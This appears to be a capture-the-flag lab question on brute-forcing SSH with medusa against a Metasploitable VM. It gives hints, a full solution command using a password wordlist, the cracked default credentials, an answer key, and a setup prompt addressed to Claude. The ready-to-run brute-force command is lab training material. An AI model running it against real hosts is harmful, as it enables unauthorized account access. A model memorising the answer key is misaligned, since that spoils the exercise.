# Q108 — Medusa SSH Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `medusa` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use medusa to brute SSH on Metasploitable. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M ssh`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-M <module>` selects protocol.
</details>

<details>
<summary>Hint 2</summary>

Alternative to hydra.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
medusa -h 192.168.52.129 -u msfadmin -P /usr/share/wordlists/fasttrack.txt -M ssh
```

Cracks msfadmin:msfadmin.

**Answer:** `cmd=medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M ssh`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q108:
1. Verify Metasploitable2 up; ssh running (22 open).
2. On Parrot: which medusa (sudo apt install medusa).
3. fasttrack.txt present.

Report back: "Lab ready for Q108 — SSH 22 open, medusa + fasttrack ready".
```
